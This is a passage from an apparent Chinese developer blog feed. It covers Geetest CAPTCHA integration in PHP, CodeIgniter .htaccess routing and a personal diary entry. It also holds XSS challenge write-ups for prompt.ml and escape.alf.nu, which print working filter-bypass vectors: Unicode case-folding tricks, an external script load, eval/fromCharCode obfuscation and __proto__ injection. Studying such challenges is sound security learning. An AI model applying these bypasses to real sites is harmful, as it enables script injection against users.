<span class="string">"xxx"</span>;</span><br><span class="line">  <span class="keyword">$this</span>-&gt;GtSdk = <span class="keyword">new</span> GeetestLib(<span class="keyword">$this</span>-&gt;captcha_id, <span class="keyword">$this</span>-&gt;private_key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li><p>静态数据加载controller</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">startCaptcha</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">	session_start();</span><br><span class="line">	$user_id = <span class="string">"test"</span>;</span><br><span class="line">	$status = <span class="keyword">$this</span>-&gt;GtSdk-&gt;pre_process($user_id);</span><br><span class="line">	$_SESSION[<span class="string">'gtserver'</span>] = $status;</span><br><span class="line">	$_SESSION[<span class="string">'user_id'</span>] = $user_id;</span><br><span class="line">	<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;GtSdk-&gt;get_response_str();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>后端验证controller</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verifyLogin</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">	session_start();</span><br><span class="line">	$user_id = $_SESSION[<span class="string">'user_id'</span>];</span><br><span class="line">	<span class="keyword">if</span> ($_SESSION[<span class="string">'gtserver'</span>] == <span class="number">1</span>) &#123;   <span class="comment">//服务器正常</span></span><br><span class="line">		$result = <span class="keyword">$this</span>-&gt;GtSdk-&gt;success_validate($_POST[<span class="string">'geetest_challenge'</span>], $_POST[<span class="string">'geetest_validate'</span>], $_POST[<span class="string">'geetest_seccode'</span>], $user_id);</span><br><span class="line">		<span class="keyword">if</span> ($result) &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&#123;"status":"success"&#125;'</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&#123;"status":"fail"&#125;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span> &#123;  <span class="comment">//服务器宕机,走failback模式</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;GtSdk-&gt;fail_validate($_POST[<span class="string">'geetest_challenge'</span>], $_POST[<span class="string">'geetest_validate'</span>], $_POST[<span class="string">'geetest_seccode'</span>])) &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&#123;"status":"success"&#125;'</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&#123;"status":"fail"&#125;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="前端Ajax-逻辑处理"><a href="#前端Ajax-逻辑处理" class="headerlink" title="前端Ajax, 逻辑处理"></a>前端Ajax, 逻辑处理</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"#mask"</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">	$(<span class="string">"#mask, #popup-captcha"</span>).hide();</span><br><span class="line">	$(<span class="string">'#cover-submit-login, #cover-submit-register'</span>).show();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$(<span class="string">"#cover-submit-login"</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">	$(<span class="string">"#mask, #popup-captcha"</span>).show();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* -- login -- */</span></span><br><span class="line"><span class="keyword">var</span> handlerPopupLogin = <span class="function"><span class="keyword">function</span> (<span class="params">captchaObj</span>) </span>&#123;</span><br><span class="line">	<span class="comment">// 将验证码加到id为captcha的元素里</span></span><br><span class="line">	captchaObj.appendTo(<span class="string">"#popup-captcha"</span>);</span><br><span class="line">	<span class="comment">//拖动验证成功后两秒(可自行设置时间)自动发生跳转等行为</span></span><br><span class="line">	captchaObj.onSuccess(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">var</span> validate = captchaObj.getValidate();</span><br><span class="line">		$.ajax(&#123;</span><br><span class="line">			url: <span class="string">"Geetest/verifyLogin"</span>, <span class="comment">// 进行二次验证</span></span><br><span class="line">			type: <span class="string">"post"</span>,</span><br><span class="line">			dataType: <span class="string">"json"</span>,</span><br><span class="line">			data: &#123;</span><br><span class="line">				<span class="comment">// 二次验证</span></span><br><span class="line">				username: $(<span class="string">'#user-login'</span>).val(),</span><br><span class="line">				password: $(<span class="string">'#pass-login'</span>).val(),</span><br><span class="line">				geetest_challenge: validate.geetest_challenge,</span><br><span class="line">				geetest_validate: validate.geetest_validate,</span><br><span class="line">				geetest_seccode: validate.geetest_seccode</span><br><span class="line">			&#125;,</span><br><span class="line">			success: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">				<span class="keyword">if</span> (data &amp;&amp; (data.status === <span class="string">"success"</span>)) &#123;</span><br><span class="line">					$(<span class="string">'#form-login'</span>).submit();</span><br><span class="line">          <span class="comment">//  进行form表单提交</span></span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="comment">//   error operation</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//  默认ajax状态</span></span><br><span class="line">$.ajax(&#123;</span><br><span class="line">	<span class="comment">// 获取id，challenge，success（是否启用failback）</span></span><br><span class="line">	url: <span class="string">"Geetest/startCaptcha/t/"</span> + (<span class="keyword">new</span> <span class="built_in">Date</span>()).getTime(), <span class="comment">// 加随机数防止缓存</span></span><br><span class="line">	type: <span class="string">"get"</span>,</span><br><span class="line">	dataType: <span class="string">"json"</span>,</span><br><span class="line">	success: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">		<span class="comment">// 使用initGeetest接口</span></span><br><span class="line">		<span class="comment">// 参数1：配置参数</span></span><br><span class="line">		<span class="comment">// 参数2：回调，回调的第一个参数验证码对象，之后可以使用它做appendTo之类的事件</span></span><br><span class="line">		initGeetest(&#123;</span><br><span class="line">			gt: data.gt,</span><br><span class="line">			challenge: data.challenge,</span><br><span class="line">			offline: !data.success <span class="comment">// 表示用户后台检测极验服务器是否宕机，一般不需要关注</span></span><br><span class="line">			<span class="comment">// 更多配置参数请参见：http://www.geetest.com/install/sections/idx-client-sdk.html#config</span></span><br><span class="line">		&#125;, handlerPopupLogin);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h2 id="最后吐槽一下"><a href="#最后吐槽一下" class="headerlink" title="最后吐槽一下"></a>最后吐槽一下</h2><p>极验官方下载的前端demo和官网的前端两个样, 最后参照了一下官网…</p>
<p>自己用的其实是mobile端的验证, 由于前端的input一开始写的<code>type=&quot;submit&quot;</code>, 所以导致每次点击都无法加载完现验证页面.<br>最后采用了button类型, 成功进行form表单提交解决.</p>
<p>给个geetest官网的解决方案(自己实现过, 但是不适用):<br>创建两个一模一样的input, 一个类型为button, 另一个为submit, button默认display=block<br>input点击之后出现验证页面, 更改show和hide状态, submit的input上线~, 验证页面在ajax成功后xxms后关闭.<br>重新进行点击, 完成表单提交. (感觉自己这个实现有点傻, 不过就是这样的..)</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://www.shuchengxian.com/Article/info/id/206.html" target="_blank" rel="external">实例thinkphp如何使用极验验证码 让验证有趣起来-高蒙</a><br><a href="http://www.geetest.com/exp_normal" target="_blank" rel="external">极验前端</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[CodeIgniter多入口URL整合处理]]></title>
      <url>http://csser.work/09/23/2016/php-ci-entrance/</url>
      <content type="html"><![CDATA[<h1 id="Defined"><a href="#Defined" class="headerlink" title="Defined"></a>Defined</h1><p>最近写了点东西, 正好遇到以前不懂的问题, 着手解决php中多入口的实现方法.参考见底<br>写的是关于<code>CodeIgniter(CI)框架的多入口URL控制问题</code>. 其他php框架原理类似</p>
<h1 id="Main"><a href="#Main" class="headerlink" title="Main()"></a>Main()</h1><h2 id="入口规则"><a href="#入口规则" class="headerlink" title="入口规则"></a>入口规则</h2><p>和常见的cms一样<br>-index 普通用户<br>-admin 管理员</p>
<h2 id="方案1-文件名规范"><a href="#方案1-文件名规范" class="headerlink" title="方案1:文件名规范"></a>方案1:文件名规范</h2><p>利用服务器重写规则进行文件名规范<br>这个说白了就是完全的两份, 改了一下名字~</p>
<h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">application</span><br><span class="line">├── assets</span><br><span class="line">│   ├── css</span><br><span class="line">│   ├── fonts</span><br><span class="line">│   └── js</span><br><span class="line">├── index</span><br><span class="line">│   ├── controllers</span><br><span class="line">├── admin</span><br><span class="line">│   ├── controllers</span><br><span class="line">├── views</span><br><span class="line">├── system</span><br><span class="line">├── index.php	<span class="comment">#入口1</span></span><br><span class="line">├── admin.php <span class="comment">#入口2</span></span><br><span class="line">├── index.html</span><br><span class="line">└── .htaccess</span><br></pre></td></tr></table></figure>
<h3 id="根目录-htaccess重写"><a href="#根目录-htaccess重写" class="headerlink" title="根目录.htaccess重写"></a>根目录.htaccess重写</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># .htaccess</span></span><br><span class="line">RewriteEngine on</span><br><span class="line">RewriteCond %&#123;REQUEST_FILENAME&#125; !<span class="_">-d</span></span><br><span class="line">RewriteCond %&#123;REQUEST_FILENAME&#125; !<span class="_">-f</span></span><br><span class="line">RewriteCond <span class="variable">$1</span> !^(index\.php|images|assets|robots\.txt|$)</span><br><span class="line">RewriteRule ^i_(.*)$ /application/index.php/<span class="variable">$1</span> [L]</span><br><span class="line">RewriteRule ^a_(.*)$ /application/admin.php/<span class="variable">$1</span> [L]</span><br></pre></td></tr></table></figure>
<h3 id="URL实现"><a href="#URL实现" class="headerlink" title="URL实现"></a>URL实现</h3><p>访问users的登录: /i_login/<br>访问admin的登录: /a_login/</p>
<h2 id="方案2-文件夹归类"><a href="#方案2-文件夹归类" class="headerlink" title="方案2:文件夹归类"></a>方案2:文件夹归类</h2><h3 id="目录结构-1"><a href="#目录结构-1" class="headerlink" title="目录结构"></a>目录结构</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">application</span><br><span class="line">├── admin</span><br><span class="line">│   ├── admin.php	<span class="comment">#入口1</span></span><br><span class="line">│   ├── controllers</span><br><span class="line">│   ├── .htaccess</span><br><span class="line">├── assets</span><br><span class="line">│   ├── css</span><br><span class="line">│   ├── fonts</span><br><span class="line">│   └── js</span><br><span class="line">├── index</span><br><span class="line">│   ├── admin.php <span class="comment">#入口2</span></span><br><span class="line">│   ├── controllers</span><br><span class="line">│   ├── .htaccess</span><br><span class="line">├── index.html</span><br><span class="line">├── system</span><br><span class="line">└── views</span><br></pre></td></tr></table></figure>
<h3 id="分支-htaccess-重写"><a href="#分支-htaccess-重写" class="headerlink" title="分支.htaccess 重写"></a>分支.htaccess 重写</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># admin's .htaccess</span></span><br><span class="line">RewriteEngine on</span><br><span class="line">RewriteCond %&#123;REQUEST_FILENAME&#125; !<span class="_">-d</span></span><br><span class="line">RewriteCond %&#123;REQUEST_FILENAME&#125; !<span class="_">-f</span></span><br><span class="line">RewriteCond <span class="variable">$1</span> !^(admin\.php|index\.php|images|assets|robots\.txt|$)</span><br><span class="line">RewriteRule ^(.*)$ /application/index/index.php/<span class="variable">$1</span></span><br></pre></td></tr></table></figure>
<h3 id="URL实现-1"><a href="#URL实现-1" class="headerlink" title="URL实现"></a>URL实现</h3><p>访问users: /index/<br>访问admin: /admin/<br>根目录的/index.html<code>301跳转</code>可以实现直接访问到/index/index.php/index</p>
<h2 id="模块分组-ThinkPHP"><a href="#模块分组-ThinkPHP" class="headerlink" title="模块分组(ThinkPHP)"></a>模块分组(ThinkPHP)</h2><p>这个见<a href="#Reference">Reference</a></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://segmentfault.com/q/1010000002491453" target="_blank" rel="external">ThinkPHP两个入口文件-segmentfault</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[xss习题集_3]]></title>
      <url>http://csser.work/08/14/2016/xss-5/</url>
      <content type="html"><![CDATA[<h2 id="defined"><a href="#defined" class="headerlink" title="defined"></a>defined</h2><p>从prompt(1)转去的<a href="http://escape.alf.nu/" target="_blank" rel="external">alert(1)</a></p>
<h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><h3 id="Level-2-“-转义"><a href="#Level-2-“-转义" class="headerlink" title="Level-2 “ \转义"></a>Level-2 “ \转义</h3><p>JSON.stringify() 双引号, 反斜线, 换行均被转义<br>思路很明确就是闭合”或者&lt;><br>这题需要了解浏览器对标签的解析吧.. 编辑器开个解析尝试写写看..<br>vector:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="regexp">/script&gt;&lt;script&gt;alert(1)/</span><span class="regexp">/</span></span><br></pre></td></tr></table></figure></p>
<p>构造完之后就是:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">console</span>.log(<span class="string">"</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="number">1</span>)<span class="comment">//");</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>在log里面的<code>&lt;/script&gt;</code>提前闭合了前面的script, 后面用注释绕过引号.这样题目的限制根本没有用到~<br>(测试了一下其他类型的标签没有这种问题)</p>
<h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level-3"></a>Level-3</h3><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://escape.alf.nu/" target="_blank" rel="external">alert(1)</a><br><a href="http://www.pwntester.com/blog/2014/01/06/escape-alf-nu-xss-challenges-write-ups-part-148/" target="_blank" rel="external">pwntester-wp-1</a><br><a href="http://www.pwntester.com/blog/2014/01/08/escape-alf-nu-xss-challenges-write-ups-part-257/" target="_blank" rel="external">pwntester-wp-2</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Object__proto__]]></title>
      <url>http://csser.work/08/13/2016/js-proto/</url>
      <content type="html"><![CDATA[<h2 id="defined"><a href="#defined" class="headerlink" title="defined"></a>defined</h2><p>还是从做xss题目中学到的使用姿势, 概念还是很简单的</p>
<h2 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h2><p><br><br><br><br><br>代码:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">  <span class="string">"source"</span> : <span class="string">"I am defined."</span>,</span><br><span class="line">  <span class="string">"__proto__"</span> : &#123;</span><br><span class="line">    <span class="string">"source"</span> : <span class="string">"I have been redefined!"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">a.source; <span class="comment">//I am defined.</span></span><br><span class="line"><span class="keyword">delete</span> a.source;</span><br><span class="line">a.source; <span class="comment">//I have been redefined!</span></span><br></pre></td></tr></table></figure></p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><code>原型规则</code>, 优先查找自己属性, 然后找爸爸.</p>
<h3 id="xss应用"><a href="#xss应用" class="headerlink" title="xss应用"></a>xss应用</h3><p>环境比较叼钻了, 匹配规则导致原有的属性被删掉, 但是可以利用<code>__proto</code>来进行一个重定义来达到目的<br>可以访问这个来测试一下:<a href="http://prompt.ml/13" target="_blank" rel="external">prompt-13</a></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/proto" target="_blank" rel="external">MDN-__proto__</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[无题]]></title>
      <url>http://csser.work/08/07/2016/say-2/</url>
      <content type="html"><![CDATA[<h3 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h3><p><br><br><br>感觉一年下来感觉又是没什么成就, 有点烦.<br><br>有点事去看了一下域名, 发现work后缀的都变贵了233.可能这个域名对我来说算是最值钱的了哈哈<br><br>还有百度似乎并不收录work域名, 这个反而让我感觉很开心, 毕竟买的时候就考虑了这个问题, 嗯, 很好.<br><br>一到家就感觉有点适应不了, 总是贪玩, 怎么可以管不住自己呢. 自己好弱啊. 还有好多书要学啊, 还有一门语言也没碰呢.<br><br>第二件事情就是和协会老司机有点交流了, 谁让我一般不会去看qq的呢(其实就是不想用wine).<br></p>
<h3 id="exit"><a href="#exit" class="headerlink" title="exit()"></a>exit()</h3>]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[xss习题集_2.2]]></title>
      <url>http://csser.work/08/07/2016/xss-4/</url>
      <content type="html"><![CDATA[<h2 id="引"><a href="#引" class="headerlink" title="引"></a>引</h2><p>还是这个站<a href="http://prompt.ml/0" target="_blank" rel="external">Prompt(1) to win</a>, 不过是下集, 没想到自己不会这么多, 才会出的下集2333</p>
<h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><h3 id="Level-9-unicode绕过"><a href="#Level-9-unicode绕过" class="headerlink" title="Level-9 unicode绕过"></a>Level-9 unicode绕过</h3><blockquote>
<p>input.replace(/&lt;([a-zA-Z])/g, ‘<_$1'); input="input.toUpperCase();" return="" '<h1="">‘ + input + ‘‘;</_$1');></p>
</blockquote>
<p>主要是过滤了所有感觉能用的字符, 答案还是比较厉害..<br>js函数大写也有被过滤, 不过可以编码和外部加载解决.注意, 在linux/unix下文件名区分大小写, 可以申请全大写或者一些奇怪的字符来进行绕过<br>vector:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ſvg&gt;<span class="xml"><span class="tag">&lt;<span class="name">ſcript</span> <span class="attr">href</span>=<span class="string">//ᄒ.ws/XXXX</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">ſcript</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>自己写的变形:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ſvg onload=&amp;#112;&amp;#114;&amp;#111;&amp;#109;&amp;#112;&amp;#116;(1)&gt;</span><br></pre></td></tr></table></figure></p>
<h4 id="example"><a href="#example" class="headerlink" title="example"></a>example</h4><p>目前我能找到的几个latin letter, 更多的需要探索 -&gt; <a href="http://graphemica.com/unicode/characters" target="_blank" rel="external">unicode-characters</a></p>
<blockquote>
<p>ß  =&gt; SS<br>ı  =&gt; I<br>ſ  =&gt; S</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.write(<span class="string">'&lt;'</span>+<span class="string">'ß'</span>.toUpperCase()[<span class="number">0</span>]+<span class="string">'cript'</span>+<span class="string">'&gt;'</span>);</span><br></pre></td></tr></table></figure>
<h3 id="Level-10"><a href="#Level-10" class="headerlink" title="Level-10"></a>Level-10</h3><blockquote>
<p>encodeURIComponent(input).replace(/prompt/g, ‘alert’);<br>input.replace(/‘/g, ‘’);</p>
</blockquote>
<p>vector:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">promp<span class="string">'t(1)</span></span><br></pre></td></tr></table></figure></p>
<p>这个好迷, 这么后面出了道简单题233</p>
<blockquote>
<p><a href="http://stackoverflow.com/questions/75980/when-are-you-supposed-to-use-escape-instead-of-encodeuri-encodeuricomponent" target="_blank" rel="external">stackoverflow-encode*</a><br>Note that encodeURIComponent does not escape the ‘ character</p>
</blockquote>
<h3 id="Level-11-DOM内json对象执行限制"><a href="#Level-11-DOM内json对象执行限制" class="headerlink" title="Level-11 DOM内json对象执行限制"></a>Level-11 DOM内json对象执行限制</h3><blockquote>
<p>input.replace(/[[|\s+*/\&lt;&gt;&amp;^:;=~!%-]/g, ‘’);<br>var dataString = ‘{“action”:”login”,”message”:”Welcome back, ‘ + input + ‘.”}’;<br>document.write(data.message)</p>
</blockquote>
<p>vector:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"(prompt(1))in"</span></span><br></pre></td></tr></table></figure></p>
<p>学到的:</p>
<blockquote>
<ol>
<li>document.write(alert(1))   //以前一直没碰到过dom类型的, 现在</li>
<li>根据console错误类型判断能否xss, 这题语法错误, 但是是Error in execution.所以只要能parse出来就行</li>
</ol>
</blockquote>
<p>Operator合集: <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Expressions_and_Operators" target="_blank" rel="external">MDN-oprators</a></p>
<p>看到后面我才知道这题正则什么意思, <code>过滤一切符号类型的operator</code>. 然后从character中考虑就是in, instanceof .etc了</p>
<h3 id="Level-12-script符号过滤"><a href="#Level-12-script符号过滤" class="headerlink" title="Level-12 script符号过滤"></a>Level-12 script符号过滤</h3><blockquote>
<p>input = encodeURIComponent(input).replace(/‘/g, ‘’);<br>input = input.replace(/prompt/g, ‘alert’);</p>
</blockquote>
<p>和第10题类似, 不过屏蔽了<code>/</code>,<code>=</code>,<code>?</code>,<code>\s</code>, <code>,</code>, <code>+</code>等能想到的一些符号, 不过没有过滤<code>.</code>这个属性引用, 所以可以进行如下的构造</p>
<p>Vector:(虽然做出来了.不过很长)<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(</span><br><span class="line">	<span class="built_in">String</span>.fromCharCode(<span class="number">112</span>)</span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">114</span>))</span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">111</span>))</span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">109</span>))</span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">112</span>))</span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">116</span>))</span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">40</span>))</span><br><span class="line">		.concat(<span class="number">1</span>)</span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">41</span>))</span><br><span class="line">)<span class="comment">//需要去掉\s</span></span><br></pre></td></tr></table></figure></p>
<p>不过答案还用了<code>toString()</code>,比较灵活~<br>vector2:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(</span><br><span class="line">	(<span class="number">1558153217</span>).toString(<span class="number">36</span>)  <span class="comment">//数字可以通过 parseInt('prompt', 36) 获得</span></span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">40</span>))</span><br><span class="line">		.concat(<span class="number">1</span>)</span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">41</span>))</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
<p>也是给我了一个提醒, 想起来以前密码学学的一个toString()和parseInt()的进制转化了.<br>嗯, github还有个改进版本<br>vector3:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>((<span class="number">1558153217</span>).toString(<span class="number">36</span>))(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p>
<p>eval这个函数感觉像是没来过一样.完全不影响后续输出</p>
<p>vector4(变种):<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="number">1558153217.</span>.toString(<span class="number">36</span>))(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p>
<p>关于<code>.</code>的多义性直接戳<a href="https://gist.github.com/a1exlism/00dcfd26d2212e509d2cad28a6745574" target="_blank" rel="external">这个</a></p>
<h3 id="Level-13-input为json对象-String-repalce-绕过"><a href="#Level-13-input为json对象-String-repalce-绕过" class="headerlink" title="Level-13 input为json对象,String.repalce()绕过"></a>Level-13 input为json对象,String.repalce()绕过</h3><p>代码表示的比较清楚..</p>
<p>关键点</p>
<ol>
<li><a href="/08/13/2016/js-proto/">__proto__</a> 利用</li>
<li>String.replace() <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace#描述" target="_blank" rel="external">内置组<code>$\</code>, $`利用</a></li>
</ol>
<p>第二点的话再写个例子好了, 放在了<a href="https://gist.github.com/a1exlism/c6e507a7af27c68e644c520859934fbd" target="_blank" rel="external">gist</a>上.</p>
<p>vector:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="string">"source"</span> : <span class="string">"-"</span>,</span><br><span class="line"> <span class="string">"__proto__"</span> : &#123;<span class="string">"source"</span> : <span class="string">"$`onerror=alert(1)&gt;"</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
